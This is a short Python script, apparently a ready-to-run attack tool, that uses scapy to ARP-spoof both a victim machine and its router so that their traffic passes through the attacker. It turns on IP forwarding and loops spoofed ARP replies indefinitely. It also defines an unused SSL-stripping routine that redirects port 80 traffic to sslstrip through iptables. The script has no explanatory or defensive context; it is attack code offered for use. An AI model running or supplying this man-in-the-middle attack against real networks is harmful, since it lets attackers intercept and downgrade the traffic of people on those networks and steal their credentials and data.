from scapy.all import *
import os

victim_ip = "192.168.1.100"  # Replace with victim's IP
router_ip = "192.168.1.1"  # Replace with router's IP

def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def enable_packet_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def ssl_strip():
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    os.system("sslstrip -l 8080 &")

print("[+] Enabling packet forwarding...")
enable_packet_forwarding()

print("[+] Running ARP Spoofing...")
while True:
    arp_spoof(victim_ip, router_ip)
    arp_spoof(router_ip, victim_ip)
    time.sleep(2)
